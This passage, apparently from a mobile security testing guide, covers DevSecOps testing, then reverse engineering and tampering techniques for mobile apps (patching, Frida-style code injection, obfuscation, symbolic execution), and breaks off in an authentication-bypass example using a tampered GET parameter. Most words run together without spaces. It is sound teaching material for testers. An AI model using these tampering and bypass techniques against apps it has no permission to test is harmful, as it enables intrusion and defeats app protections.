whatneedstobeimproved. Distinguishingbetweentestsperformedbyaninternalteamandtestsperformedbyanindependentthirdpartyisimpor- tant. Internal tests are usually useful for improving daily operations, while third-party tests are more beneficial to the wholeorganization. Internaltestscanbeperformedquiteoften,butthird-partytestinghappensatmostonceortwicea year;also,theformerarelessexpensivethanthelatter. Botharenecessary,andmanyregulationsmandatetestsfrom anindependentthirdpartybecausesuchtestscanbemoretrustworthy. Security Testing in Waterfall What Waterfall Is and How Testing Activities Are Arranged Basically,SDLCdoesn’tmandatetheuseofanydevelopmentlifecycle: itissafetosaythatsecuritycan(andmust!) be addressedinanysituation. Waterfallmethodologieswerepopularbeforethe21stcentury. Themostfamousapplicationiscalledthe“Vmodel”,in whichphasesareperformedinsequenceandyoucanbacktrackonlyasinglestep. Thetestingactivitiesofthismodel occurinsequenceandareperformedasawhole,mostlyatthepointinthelifecyclewhenmostoftheappdevelopmentis complete. Thisactivitysequencemeansthatchangingthearchitectureandotherfactorsthatweresetupatthebeginning oftheprojectishardlypossibleeventhoughcodemaybechangedafterdefectshavebeenidentified. Security Testing for Agile/DevOps and DevSecOps DevOpsreferstopracticesthatfocusonaclosecollaborationbetweenallstakeholdersinvolvedinsoftwaredevelopment (generallycalledDevs)andoperations(generallycalledOps). DevOpsisnotaboutmergingDevsandOps. Development 37\nandoperationsteamsoriginallyworkedinsilos,whenpushingdevelopedsoftwaretoproductioncouldtakeasignificant amountoftime. WhendevelopmentteamsmademovingmoredeliveriestoproductionnecessarybyworkingwithAgile, operationteamshadtospeeduptomatchthepace. DevOpsisthenecessaryevolutionofthesolutiontothatchallenge inthatitallowssoftwaretobereleasedtousersmorequickly. Thisislargelyaccomplishedviaextensivebuildautoma- tion, the process of testing and releasing software, and infrastructure changes (in addition to the collaboration aspect of DevOps). This automation is embodied in the deployment pipeline with the concepts of Continuous Integration and ContinuousDelivery(CI/CD). Peoplemayassumethattheterm“DevOps”representscollaborationbetweendevelopmentandoperationsteamsonly, however,asDevOpsthoughtleaderGeneKimputsit: “Atfirstblush,itseemsasthoughtheproblemsarejustbetween Devs and Ops, but test is in there, and you have informationsecurity objectives, and the need to protect systems and data. Thesearetop-levelconcernsofmanagement,andtheyhavebecomepartoftheDevOpspicture.” Inotherwords,DevOpscollaborationincludesqualityteams,securityteams,andmanyotherteamsrelatedtotheproject. Whenyouhear“DevOps”today,youshouldprobablybethinkingofsomethinglikeDevOpsQATestInfoSec. Indeed,DevOps valuespertaintoincreasingnotonlyspeedbutalsoquality,security,reliability,stability,andresilience. Securityisjustascriticaltobusinesssuccessastheoverallquality,performance,andusabilityofanapp. Asdevelopment cyclesareshortenedanddeliveryfrequenciesincreased,makingsurethatqualityandsecurityarebuiltinfromthevery beginningbecomesessential. DevSecOpsisallaboutaddingsecuritytoDevOpsprocesses. Mostdefectsareidentified duringproduction. DevOpsspecifiesbestpracticesforidentifyingasmanydefectsaspossibleearlyinthelifecycleand forminimizingthenumberofdefectsinthereleasedapp. However,DevSecOpsisnotjustalinearprocessorientedtowardsdeliveringthebestpossiblesoftwaretooperations;it isalsoamandatethatoperationscloselymonitorsoftwarethat’sinproductiontoidentifyissuesandfixthembyforming aquickandefficientfeedbackloopwithdevelopment. DevSecOpsisaprocessthroughwhichContinuousImprovement isheavilyemphasized. Thehumanaspectofthisemphasisisreflectedinthecreationofcross-functionalteamsthatworktogethertoachieve businessoutcomes. Thissectionisfocusedonnecessaryinteractionsandintegratingsecurityintothedevelopmentlife cycle(whichstartswithprojectinceptionandendswiththedeliveryofvaluetousers). What Agile and DevSecOps Are and How Testing Activities Are Arranged Overview 38\nAutomation is a key DevSecOps practice: as stated earlier, the frequency of deliveries from development to operation increaseswhencomparedtothetraditionalapproach,andactivitiesthatusuallyrequiretimeneedtokeepup,e.g.deliver the same added value while taking less time. Unproductive activities must consequently be abandoned, and essential tasksmustbefastened. Thesechangesimpactinfrastructurechanges,deployment,andsecurity: • infrastructureisbeingimplementedasInfrastructureasCode • deploymentisbecomingmorescripted,translatedthroughtheconceptsofContinuousIntegrationandContin- uousDelivery • securityactivitiesarebeingautomatedasmuchaspossibleandtakingplacethroughoutthelifecycle Thefollowingsectionsprovidemoredetailsaboutthesethreepoints. Infrastructure as Code Insteadofmanuallyprovisioningcomputingresources(physicalservers, virtualmachines, etc.) andmodifyingconfigu- ration files, Infrastructure as Code is based on the use of tools and automation to fasten the provisioning process and makeitmorereliableandrepeatable. Correspondingscriptsareoftenstoredunderversioncontroltofacilitatesharing andissueresolution. InfrastructureasCodepracticesfacilitatecollaborationbetweendevelopmentandoperationsteams,withthefollowing results: • Devsbetterunderstandinfrastructurefromafamiliarpointofviewandcanprepareresourcesthattherunningapp willrequire. • Opsoperateanenvironmentthatbettersuitstheapp,andtheysharealanguagewithDevs. InfrastructureasCodealsofacilitatestheconstructionoftheenvironmentsrequiredbyclassicalsoftwarecreationprojects, fordevelopment(“DEV”),integration(“INT”),testing(“PPR”forPre-Production. Sometestsareusuallyperformedin earlier environments, and PPR tests mostly pertain to non-regression and performance with data that’s similar to data usedinproduction),andproduction(“PRD”).Thevalueofinfrastructureascodeliesinthepossiblesimilaritybetween environments(theyshouldbethesame). InfrastructureasCodeiscommonlyusedforprojectsthathaveCloud-basedresourcesbecausemanyvendorsprovideAPIs thatcanbeusedforprovisioningitems(suchasvirtualmachines, storagespaces, etc.) andworkingonconfigurations (e.g., modifying memory sizes or the number of CPUs used by virtual machines). These APIs provide alternatives to administrators’performingtheseactivitiesfrommonitoringconsoles. ThemaintoolsinthisdomainarePuppet,Terraform,Packer,ChefandAnsible. Deployment Thedeploymentpipeline’ssophisticationdependsonthematurityoftheprojectorganizationordevelopmentteam. Inits simplestform,thedeploymentpipelineconsistsofacommitphase. Thecommitphaseusuallyinvolvesrunningsimple compiler checks and the unit test suite as well as creating a deployable artifact of the app. A release candidate is the latestversionthathasbeencheckedintothetrunkoftheversioncontrolsystem. Releasecandidatesareevaluatedby thedeploymentpipelineforconformitytostandardstheymustfulfillfordeploymenttoproduction. Thecommitphaseisdesignedtoprovideinstantfeedbacktodevelopersandisthereforerunoneverycommittothetrunk. Timeconstraintsexistbecauseofthisfrequency. Thecommitphaseshouldusuallybecompletewithinfiveminutes,and itshouldn’ttakelongerthanten. Adheringtothistimeconstraintisquitechallengingwhenitcomestosecuritybecause manysecuritytoolscan’tberunquicklyenough(#paul,#mcgraw). CI/CD means “Continuous Integration/Continuous Delivery” in some contexts and “Continuous Integration/Continuous Deployment”inothers. Actually,thelogicis: • ContinuousIntegrationbuildactions(eithertriggeredbyacommitorperformedregularly)useallsourcecodeto build a candidate release. Tests can then be performed and the release’s compliance with security, quality, etc., rulescanbechecked. Ifcasecomplianceisconfirmed,theprocesscancontinue;otherwise,thedevelopmentteam mustremediatetheissue(s)andproposechanges. • ContinuousDeliverycandidatereleasescanproceedtothepre-productionenvironment. Ifthereleasecanthenbe validated(eithermanuallyorautomatically),deploymentcancontinue. Ifnot,theprojectteamwillbenotifiedand properaction(s)mustbetaken. 39\n• ContinuousDeploymentreleasesaredirectlytransitionedfromintegrationtoproduction,e.g.,theybecomeacces- sible to the user. However, no release should go to production if significant defects have been identified during previousactivities. The delivery and deployment of apps with low or medium sensitivity may be merged into a single step, and validation maybeperformedafterdelivery. However,keepingthesetwoactionsseparateandusingstrongvalidationarestrongly advisedforsensitiveapps. Security Atthispoint,thebigquestionis: nowthatotheractivitiesrequiredfordeliveringcodearecompletedsignificantlyfaster andmoreeffectively,howcansecuritykeepup? Howcanwemaintainanappropriatelevelofsecurity? Deliveringvalue tousersmoreoftenwithdecreasedsecuritywoulddefinitelynotbegood! Onceagain,theanswerisautomationandtooling: byimplementingthesetwoconceptsthroughouttheprojectlifecycle, youcanmaintainandimprovesecurity. Thehighertheexpectedlevelofsecurity, themorecontrols, checkpoints, and emphasiswilltakeplace. Thefollowingareexamples: • Static Application Security Testing can take place during the development phase, and it can be integrated into the Continuous Integration process with more or less emphasis on scan results. You can establish more or less demandingSecureCodingRulesanduseSASTtoolstochecktheeffectivenessoftheirimplementation. • Dynamic Application Security Testing may be automatically performed after the app has been built (e.g., after ContinuousIntegrationhastakenplace)andbeforedelivery,again,withmoreorlessemphasisonresults. • You can add manual validation checkpoints between consecutive phases, for example, between delivery and de- ployment. ThesecurityofanappdevelopedwithDevOpsmustbeconsideredduringoperations. Thefollowingareexamples: • Scanningshouldtakeplaceregularly(atboththeinfrastructureandapplicationlevel). • Pentesting may take place regularly. (The version of the app used in production is the version that should be pentested, and the testing should take place in a dedicated environment and include data that’s similar to the productionversiondata. SeethesectiononPenetrationTestingformoredetails.) • Activemonitoringshouldbeperformedtoidentifyissuesandremediatethemassoonaspossibleviathefeedback loop. 40\nReferences • [paul]-M.Paul. Official(ISC)2GuidetotheCSSLPCBK,SecondEdition((ISC)2Press),2014 • [mcgraw]-GMcGraw. SoftwareSecurity: BuildingSecurityIn,2006 41\nMobile App Tampering and Reverse Engineering Reverseengineeringandtamperingtechniqueshavelongbelongedtotherealmofcrackers,modders,malwareanalysts, etc. For“traditional”securitytestersandresearchers,reverseengineeringhasbeenmoreofacomplementaryskill. But thetidesareturning: mobileappblack-boxtestingincreasinglyrequiresdisassemblingcompiledapps,applyingpatches, and tampering with binary code or even live processes. The fact that many mobile apps implement defenses against unwelcometamperingdoesn’tmakethingseasierforsecuritytesters. Reverseengineeringamobileappistheprocessofanalyzingthecompiledapptoextractinformationaboutitssource code. Thegoalofreverseengineeringiscomprehendingthecode. Tamperingistheprocessofchangingamobileapp(eitherthecompiledapportherunningprocess)oritsenvironmentto affectitsbehavior. Forexample,anappmightrefusetorunonyourrootedtestdevice,makingitimpossibletorunsome ofyourtests. Insuchcases,you’llwanttoaltertheapp’sbehavior. Mobile security testers are served well by understanding basic reverse engineering concepts. They should also know mobile devices and operating systems inside out: processor architecture, executable format, programming language intricacies,andsoforth. Reverse engineering is an art, and describing its every facet would fill a whole library. The sheer range of techniques and specializations is mind-blowing: one can spend years working on a very specific and isolated sub-problem, such as automating malware analysis or developing novel de-obfuscation methods. Security testers are generalists; to be effectivereverseengineers,theymustfilterthroughthevastamountofrelevantinformation. There is no generic reverse engineering process that always works. That said, we’ll describe commonly used methods andtoolslaterinthisguide,andgiveexamplesoftacklingthemostcommondefenses. Why You Need It Mobilesecuritytestingrequiresatleastbasicreverseengineeringskillsforseveralreasons: 1. Toenableblack-boxtestingofmobileapps. Modernappsoftenincludecontrolsthatwillhinderdynamicanalysis. SSLpinningandend-to-end(E2E)encryptionsometimespreventyoufrominterceptingormanipulatingtrafficwithaproxy. Rootdetectioncouldpreventtheappfromrunningonarooteddevice,preventingyoufromusingadvancedtestingtools. Youmustbeabletodeactivatethesedefenses. 2. Toenhancestaticanalysisinblack-boxsecuritytesting. Inablack-boxtest,staticanalysisoftheappbytecode orbinarycodehelpsyouunderstandtheinternallogicoftheapp. Italsoallowsyoutoidentifyflawssuchashardcoded credentials. 3. Toassessresilienceagainstreverseengineering. Appsthatimplementthesoftwareprotectionmeasureslisted intheMobileApplicationSecurityVerificationStandardAnti-ReversingControls(MASVS-R)shouldwithstandreverseengi- neeringtoacertaindegree. Toverifytheeffectivenessofsuchcontrols,thetestermayperformaresilienceassessment aspartofthegeneralsecuritytest. Fortheresilienceassessment,thetesterassumestheroleofthereverseengineer andattemptstobypassdefenses. Beforewediveintotheworldofmobileappreversing,wehavesomegoodnewsandsomebadnews. Let’sstartwiththe goodnews: Ultimately,thereverseengineeralwayswins. Thisisparticularlytrueinthemobileindustry,wherethereverseengineerhasanaturaladvantage: thewaymobileapps aredeployedandsandboxedisbydesignmorerestrictivethanthedeploymentandsandboxingofclassicalDesktopapps, so including the rootkit-like defensive mechanisms often found in Windows software (e.g., DRM systems) is simply not feasible. TheopennessofAndroidallowsreverseengineerstomakefavorablechangestotheoperatingsystem,aiding thereverseengineeringprocess. iOSgivesreverseengineerslesscontrol,butdefensiveoptionsarealsomorelimited. The bad news is that dealing with multi-threaded anti-debugging controls, cryptographic white-boxes, stealthy anti- tampering features, and highly complex control flow transformations is not for the faint-hearted. The most effective software protection schemes are proprietary and won’t be beaten with standard tweaks and tricks. Defeating them re- quires tedious manual analysis, coding, frustration and, depending on your personality, sleepless nights and strained relationships. 42\nIt’s easy for beginners to get overwhelmed by the sheer scope of reversing. The best way to get started is to set up some basic tools (see the relevant sections in the Android and iOS reversing chapters) and start with simple reversing tasks and crackmes. You’ll need to learn about the assembler/bytecode language, the operating system, obfuscations youencounter,andsoon. Startwithsimpletasksandgraduallyleveluptomoredifficultones. Inthefollowingsection,we’llgiveanoverviewofthetechniquesmostcommonlyusedinmobileappsecuritytesting. In laterchapters,we’lldrilldownintoOS-specificdetailsofbothAndroidandiOS. Basic Tampering Techniques Binary Patching Patchingistheprocessofchangingthecompiledapp,e.g.,changingcodeinbinaryexecutables,modifyingJavabytecode, ortamperingwithresources. Thisprocessisknownasmoddinginthemobilegamehackingscene. Patchescanbeapplied inmanyways,includingeditingbinaryfilesinahexeditoranddecompiling,editing,andre-assemblinganapp. We’llgive detailedexamplesofusefulpatchesinlaterchapters. Keep in mind that modern mobile operating systems strictly enforce code signing, so running modified apps is not as straightforwardasitusedtobeindesktopenvironments. Securityexpertshadamucheasierlifeinthe90s! Fortunately, patchingisnot verydifficultifyouworkonyourowndevice. Yousimplyhavetore-signtheappordisablethedefault codesignatureverificationfacilitiestorunmodifiedcode. Code Injection Codeinjectionisaverypowerfultechniquethatallowsyoutoexploreandmodifyprocessesatruntime. Injectioncanbe implementedinvariousways,butyou’llgetbywithoutknowingallthedetailsthankstofreelyavailable,well-documented toolsthatautomatetheprocess. Thesetoolsgiveyoudirectaccesstoprocessmemoryandimportantstructuressuchas liveobjectsinstantiatedbytheapp. Theycomewithmanyutilityfunctionsthatareusefulforresolvingloadedlibraries, hookingmethodsandnativefunctions,andmore. Processmemorytamperingismoredifficulttodetectthanfilepatching, soitisthepreferredmethodinmostcases. Substrate,Frida,andXposedarethemostwidelyusedhookingandcodeinjectionframeworksinthemobileindustry. The threeframeworksdifferindesignphilosophyandimplementationdetails: SubstrateandXposedfocusoncodeinjection and/orhooking, whileFridaaimstobeafull-blown“dynamicinstrumentationframework”, incorporatingcodeinjection, languagebindings,andaninjectableJavaScriptVMandconsole. However,youcanalsoinstrumentappswithSubstratebyusingittoinjectCycript,theprogrammingenvironment(aka “Cycript-to-JavaScript”compiler)authoredbySaurikofCydiafame. Tocomplicatethingsevenmore,Frida’sauthorsalso created a fork of Cycript called “frida-cycript”. It replaces Cycript’s runtime with a Frida-based runtime called Mjølner. This enables Cycript to run on all the platforms and architectures maintained by frida-core (if you are confused at this point,don’tworry). Thereleaseoffrida-cycriptwasaccompaniedbyablogpostbyFrida’sdeveloperOletitled“Cycript onSteroids”,atitlethatSaurikwasn’tveryfondof. We’llincludeexamplesofallthreeframeworks. WerecommendstartingwithFridabecauseitisthemostversatileofthe three(forthisreason,we’llalsoincludemoreFridadetailsandexamples). Notably,FridacaninjectaJavaScriptVMintoa processonbothAndroidandiOS,whileCycriptinjectionwithSubstrateonlyworksoniOS.Ultimately,however,youcan ofcourseachievemanyofthesamegoalswitheitherframework. Static and Dynamic Binary Analysis Reverseengineeringistheprocessofreconstructingthesemanticsofacompiledprogram’ssourcecode. Inotherwords, youtaketheprogramapart,runit,simulatepartsofit,anddootherunspeakablethingstoittounderstandwhatitdoes andhow. 43\nUsing Disassemblers and Decompilers Disassemblersanddecompilersallowyoutotranslateanapp’sbinarycodeorbytecodebackintoamoreorlessunder- standableformat. Byusingthesetoolsonnativebinaries,youcanobtainassemblercodethatmatchesthearchitecture theappwascompiledfor. Disassemblersconvertmachinecodetoassemblycodewhichinturnisusedbydecompilers togenerateequivalenthigh-levellanguagecode. AndroidJavaappscanbedisassembledtosmali,whichisanassembly languagefortheDEXformatusedbyDalvik,Android’sJavaVM.Smaliassemblycanalsobequiteeasilydecompiledback toequivalentJavacode. Intheory,themappingbetweenassemblyandmachinecodeshouldbeone-to-one,andthereforeitmaygivetheimpres- sionthatdisassemblingisasimpletask. Butinpractice,therearemultiplepitfallssuchas: • Reliabledistinctionbetweencodeanddata. • Variableinstructionsize. • Indirectbranchinstructions. • FunctionswithoutexplicitCALLinstructionswithintheexecutable’scodesegment. • Positionindependentcode(PIC)sequences. • Handcraftedassemblycode. Similarly,decompilationisaverycomplicatedprocess,involvingmanydeterministicandheuristicbasedapproaches. Asa consequence,decompilationisusuallynotreallyaccurate,butneverthelessveryhelpfulingettingaquickunderstanding of the function being analyzed. The accuracy of decompilation depends on the amount of information available in the code being decompiled and the sophistication of the decompiler. In addition, many compilation and post-compilation tools introduce additional complexity to the compiled code in order to increase the difficulty of comprehension and/or evendecompilationitself. Suchcodereferredtoasobfuscatedcode. Overthepastdecadesmanytoolshaveperfectedtheprocessofdisassemblyanddecompilation,producingoutputwith high fidelity. Advanced usage instructions for any of the available tools can often easily fill a book of their own. The best way to get started is to simply pick up a tool that fits your needs and budget and get a well-reviewed user guide. Inthissection, wewillprovideanintroductiontosomeofthosetoolsandinthesubsequent“ReverseEngineeringand Tampering”AndroidandiOSchapterswe’llfocusonthetechniquesthemselves,especiallythosethatarespecifictothe platformathand. Obfuscation Obfuscationistheprocessoftransformingcodeanddatatomakeitmoredifficulttocomprehend(andsometimeseven difficult to disassemble). It is usually an integral part of the software protection scheme. Obfuscation isn’t something thatcanbesimplyturnedonoroff,programscanbemadeincomprehensible,inwholeorinpart,inmanywaysandto differentdegrees. Note: Allpresentedtechniquesbelowwillnotstopsomeonewithenoughtimeandbudgetfromreverseengineer- ing your app. However, combining these techniques will make their job significantly harder. The aim is thus to discouragereverseengineersfromperformingfurtheranalysisandnotmakingitworththeeffort. Thefollowingtechniquescanbeusedtoobfuscateanapplication: • Nameobfuscation • Instructionsubstitution • Controlflowflattening • Deadcodeinjection • Stringencryption • Packing Name Obfuscation The standard compiler generates binary symbols based on class and function names from the source code. Therefore, if no obfuscation is applied, symbol names remain meaningful and can easily be extracted from the app binary. For instance, afunctionwhichdetectsajailbreakcanbelocatedbysearchingforrelevantkeywords(e.g.“jailbreak”). The listingbelowshowsthedisassembledfunctionJailbreakDetectionViewController.jailbreakTest4Tappedfromthe DamnVulnerableiOSApp(DVIA-v2). 44\n__T07DVIA_v232JailbreakDetectionViewControllerC20jailbreakTest4TappedyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Aftertheobfuscationwecanobservethatthesymbol’snameisnolongermeaningfulasshownonthelistingbelow. __T07DVIA_v232zNNtWKQptikYUBNBgfFVMjSkvRdhhnbyyFySbyypF: stp x22,x21,[sp,#-0x30]! mov rbp,rsp Nevertheless,thisonlyappliestothenamesoffunctions,classesandfields. Theactualcoderemainsunmodified,soan attackercanstillreadthedisassembledversionofthefunctionandtrytounderstanditspurpose(e.g.toretrievethelogic ofasecurityalgorithm). Instruction Substitution This technique replaces standard binary operators like addition or subtraction with more complex representations. For example,anadditionx = a + bcanberepresentedasx = -(-a) - (-b). However,usingthesamereplacementrepre- sentation could be easily reversed, so it is recommended to add multiple substitution techniques for a single case and introducearandomfactor. Thistechniquecanbereversedduringdecompilation,butdependingonthecomplexityand depthofthesubstitutions,reversingitcanstillbetimeconsuming. Control Flow Flattening Controlflowflatteningreplacesoriginalcodewithamorecomplexrepresentation. Thetransformationbreaksthebodyof afunctionintobasicblocksandputsthemallinsideasingleinfiniteloopwithaswitchstatementthatcontrolstheprogram flow. This makes the program flow significantly harder to follow because it removes the natural conditional constructs thatusuallymakethecodeeasiertoread. 45\nTheimageshowshowcontrolflowflatteningalterscode. See“ObfuscatingC++programsviacontrolflowflattening”for moreinformation. Dead Code Injection Thistechniquemakestheprogram’scontrolflowmorecomplexbyinjectingdeadcodeintotheprogram. Deadcodeis astubofcodethatdoesn’taffecttheoriginalprogram’sbehaviorbutincreasestheoverheadofthereverseengineering process. String Encryption Applications are often compiled with hardcoded keys, licences, tokens and endpoint URLs. By default, all of them are storedinplaintextinthedatasectionofanapplication’sbinary. Thistechniqueencryptsthesevaluesandinjectsstubs ofcodeintotheprogramthatwilldecryptthatdatabeforeitisusedbytheprogram. Packing Packing is a dynamic rewriting obfuscation technique which compresses or encrypts the original executable into data anddynamicallyrecoversitduringexecution. Packinganexecutablechangesthefilesignatureinanattempttoavoid signature-baseddetection. Debugging and Tracing Inthetraditionalsense,debuggingistheprocessofidentifyingandisolatingproblemsinaprogramaspartofthesoftware developmentlifecycle. Thesametoolsusedfordebuggingarevaluabletoreverseengineersevenwhenidentifyingbugs 46\nisnottheprimarygoal. Debuggersenableprogramsuspensionatanypointduringruntime, inspectionoftheprocess’ internalstate,andevenregisterandmemorymodification. Theseabilitiessimplifyprograminspection. Debugging usually means interactive debugging sessions in which a debugger is attached to the running process. In contrast, tracing refers to passive logging of information about the app’s execution (such as API calls). Tracing can be doneinseveralways,includingdebuggingAPIs,functionhooks,andKerneltracingfacilities. Again,we’llcovermanyof thesetechniquesintheOS-specific“ReverseEngineeringandTampering”chapters. Advanced Techniques Formorecomplicatedtasks, suchasde-obfuscatingheavilyobfuscatedbinaries, youwon’tgetfarwithoutautomating certainpartsoftheanalysis. Forexample,understandingandsimplifyingacomplexcontrolflowgraphbasedonmanual analysisinthedisassemblerwouldtakeyouyears(andmostlikelydriveyoumadlongbeforeyou’redone). Instead,you canaugmentyourworkflowwithcustommadetools. Fortunately,moderndisassemblerscomewithscriptingandexten- sionAPIs,andmanyusefulextensionsareavailableforpopulardisassemblers. Therearealsoopensourcedisassembling enginesandbinaryanalysisframeworks. Asalwaysinhacking,theanything-goesruleapplies: simplyusewhateverismostefficient. Everybinaryisdifferent,and allreverseengineershavetheirownstyle. Often,thebestwaytoachieveyourgoalistocombineapproaches(suchas emulator-based tracing and symbolic execution). To get started, pick a good disassembler and/or reverse engineering framework,thengetcomfortablewiththeirparticularfeaturesandextensionAPIs. Ultimately,thebestwaytogetbetter istogethands-onexperience. Dynamic Binary Instrumentation Anotherusefulapproachfornativebinariesisdynamicbinaryinstrumentations(DBI).Instrumentationframeworkssuch as Valgrind and PIN support fine-grained instruction-level tracing of single processes. This is accomplished by insert- ing dynamically generated code at runtime. Valgrind compiles fine on Android, and pre-built binaries are available for download. TheValgrindREADMEincludesspecificcompilationinstructionsforAndroid. Emulation-based Dynamic Analysis Emulationisanimitationofacertaincomputerplatformorprogrambeingexecutedindifferentplatformorwithinanother program. Thesoftwareorhardwareperformingthisimitationiscalledanemulator. Emulatorsprovideamuchcheaper alternativetoanactualdevice,whereausercanmanipulateitwithoutworryingaboutdamagingthedevice. Thereare multipleemulatorsavailableforAndroid,butforiOStherearepracticallynoviableemulatorsavailable. iOSonlyhasa simulator,shippedwithinXcode. The difference between a simulator and an emulator often causes confusion and leads to use of the two terms inter- changeably, butinrealitytheyaredifferent, speciallyfortheiOSusecase. Anemulatormimicsboththesoftwareand hardwareenvironmentofatargetedplatform. Ontheotherhand,asimulatoronlymimicsthesoftwareenvironment. QEMUbasedemulatorsforAndroidtakeintoconsiderationtheRAM,CPU,batteryperformanceetc(hardwarecomponents) whilerunninganapplication,butinaniOSsimulatorthishardwarecomponentbehaviourisnottakenintoconsideration atall. TheiOSsimulatorevenlackstheimplementationoftheiOSkernel,asaresultifanapplicationisusingsyscallsit cannotbeexecutedinthissimulator. Insimplewords,anemulatorisamuchcloserimitationofthetargetedplatform,whileasimulatormimicsonlyapartof it. Runninganappintheemulatorgivesyoupowerfulwaystomonitorandmanipulateitsenvironment. Forsomereverse engineeringtasks,especiallythosethatrequirelow-levelinstructiontracing,emulationisthebest(oronly)choice. Un- fortunately,thistypeofanalysisisonlyviableforAndroid,becausenofreeoropensourceemulatorexistsforiOS(the iOSsimulatorisnotanemulator,andappscompiledforaniOSdevicedon’trunonit). TheonlyiOSemulatoravailable isacommercialSaaSsolution-Corellium. We’llprovideanoverviewofpopularemulation-basedanalysisframeworksfor Androidinthe“TamperingandReverseEngineeringonAndroid”chapter. 47\nCustom Tooling with Reverse Engineering Frameworks EventhoughmostprofessionalGUI-baseddisassemblersfeaturescriptingfacilitiesandextensibility,theyaresimplynot well-suitedtosolvingparticularproblems. Reverseengineeringframeworksallowyoutoperformandautomateanykind ofreversingtaskwithoutdependingonaheavy-weightGUI.Notably,mostreversingframeworksareopensourceand/or availableforfree. Popularframeworkswithsupportformobilearchitecturesincluderadare2andAngr. Example: Program Analysis with Symbolic/Concolic Execution In the late 2000s, testing based on symbolic execution has become a popular way to identify security vulnerabilities. Symbolic “execution” actually refers to the process of representing possible paths through a program as formulas in first-order logic. Satisfiability Modulo Theories (SMT) solvers are used to check the satisfiability of these formulas and provide solutions, including concrete values of the variables needed to reach a certain point of execution on the path correspondingtothesolvedformula. Insimplewords,symbolicexecutionismathematicallyanalyzingaprogramwithoutexecutingit. Duringanalysis,each unknowninputisrepresentedasamathematicalvariable(asymbolicvalue),andhencealltheoperationsperformedon thesevariablesarerecordedasatreeofoperations(aka. AST(abstractsyntaxtree),fromcompilertheory). TheseASTs can be translated into so-called constraints that will be interpreted by a SMT solver. In the end of this analysis, a final mathematicalequationisobtained,inwhichthevariablesaretheinputswhosevaluesarenotknown. SMTsolversare specialprogramswhichsolvetheseequationstogivepossiblevaluesfortheinputvariablesgivenafinalstate. Toillustratethis,imagineafunctionwhichtakesoneinput(x)andmultipliesitbythevalueofasecondinput(y). Finally, thereisanifconditionwhichchecksifthevaluecalculatedisgreaterthanthevalueofanexternalvariable(z),andreturns “success”iftrue,elsereturns“fail”. Theequationforthisoperationwillbe(x * y) > z. Ifwewantthefunctiontoalwaysreturn“success”(finalstate),wecantelltheSMTsolvertocalculatethevaluesforx andy(inputvariables)whichsatisfythecorrespondingequation. Asisthecaseforglobalvariables,theirvaluecanbe changedfromoutsidethisfunction,whichmayleadtodifferentoutputswheneverthisfunctionisexecuted. Thisaddsto additionalcomplexityindeterminingcorrectsolution. Internally SMT solvers use various equation solving techniques to generate solution for such equations. Some of the techniquesareveryadvancedandtheirdiscussionisbeyondthescopeofthisbook. In a real world situation, the functions are much more complex than the above example. The increased complexity of thefunctionscanposesignificantchallengesforclassicalsymbolicexecution. Someofthechallengesaresummarised below: • Loopsandrecursionsinaprogrammayleadtoinfiniteexecutiontree. • Multipleconditionalbranchesornestedconditionsmayleadtopathexplosion. • ComplexequationsgeneratedbysymbolicexecutionmaynotbesolvablebySMTsolversbecauseoftheirlimita- tions. • Programisusingsystemcalls,librarycallsornetworkeventswhichcannotbehandledbysymbolicexecution. Toovercomethesechallenges,typically,symbolicexecutioniscombinedwithothertechniquessuchasdynamicexecution (also called concrete execution) to mitigate the path explosion problem specific to classical symbolic execution. This combinationofconcrete(actual)andsymbolicexecutionisreferredtoasconcolicexecution(thenameconcolicstems fromconcreteandsymbolic),sometimesalsocalledasdynamicsymbolicexecution. To visualize this, in the above example, we can obtain the value of the external variable by performing further reverse engineeringorbydynamicallyexecutingtheprogramandfeedingthisinformationintooursymbolicexecutionanalysis. Thisextrainformationwillreducethecomplexityofourequationsandmayproducemoreaccurateanalysisresults. To- getherwithimprovedSMTsolversandcurrenthardwarespeeds,concolicexecutionallowstoexplorepathsinmedium-size softwaremodules(i.e.,ontheorderof10KLOC). Inaddition,symbolicexecutionalsocomesinhandyforsupportingde-obfuscationtasks,suchassimplifyingcontrolflow graphs. For example, Jonathan Salwan and Romain Thomas have shown how to reverse engineer VM-based software protections using Dynamic Symbolic Execution [#salwan] (i.e., using a mix of actual execution traces, simulation, and symbolicexecution). In the Android section, you’ll find a walkthrough for cracking a simple license check in an Android application using symbolicexecution. 48\nReferences • [#vadla]OleAndréVadlaRavnås, Anatomyofacodetracer-https://medium.com/@oleavr/anatomy-of-a-code- tracer-b081aadb0df8 • [#salwan] Jonathan Salwan and Romain Thomas, How Triton can help to reverse virtual machine based software protections-https://drive.google.com/file/d/1EzuddBA61jEMy8XbjQKFF3jyoKwW7tLq/view?usp=sharing 49\nMobile App Authentication Architectures Authenticationandauthorizationproblemsareprevalentsecurityvulnerabilities. Infact, theyconsistentlyranksecond highestintheOWASPTop10. Mostmobileappsimplementsomekindofuserauthentication. Eventhoughpartoftheauthenticationandstatemanage- mentlogicisperformedbythebackendservice,authenticationissuchanintegralpartofmostmobileapparchitectures thatunderstandingitscommonimplementationsisimportant. SincethebasicconceptsareidenticaloniOSandAndroid,we’lldiscussprevalentauthenticationandauthorizationarchi- tecturesandpitfallsinthisgenericguide. OS-specificauthenticationissues,suchaslocalandbiometricauthentication, willbediscussedintherespectiveOS-specificchapters. General Assumptions Appropriate Authentication is in Place Performthefollowingstepswhentestingauthenticationandauthorization: • Identifytheadditionalauthenticationfactorstheappuses. • Locateallendpointsthatprovidecriticalfunctionality. • Verifythattheadditionalfactorsarestrictlyenforcedonallserver-sideendpoints. Authenticationbypassvulnerabilitiesexistwhenauthenticationstateisnotconsistentlyenforcedontheserverandwhen the client can tamper with the state. While the backend service is processing requests from the mobile client, it must consistently enforce authorization checks: verifying that the user is logged in and authorized every time a resource is requested. ConsiderthefollowingexamplefromtheOWASPWebTestingGuide. Intheexample,awebresourceisaccessedthrough aURL,andtheauthenticationstateispassedthroughaGETparameter: http://www.site.com/page.asp?authenticated=no The client can arbitrarily change the GET parameters sent with the request. Nothing prevents the client from simply changingthevalueoftheauthenticatedparameterto“yes”,effectivelybypassingauthentication. Althoughthisisasimplisticexamplethatyouprobablywon’tfindinthewild,programmerssometimesrelyon“hidden” client-side parameters, such as cookies, to maintain authentication state. They assume that these parameters can’t be tampered with. Consider, for example, the following classic vulnerability in Nortel Contact Center Manager. The administrativewebapplicationofNortel’sappliancereliedonthecookie“isAdmin”todeterminewhetherthelogged-in user should be granted administrative privileges. Consequently, it was possible to get admin access by simply setting thecookievalueasfollows: 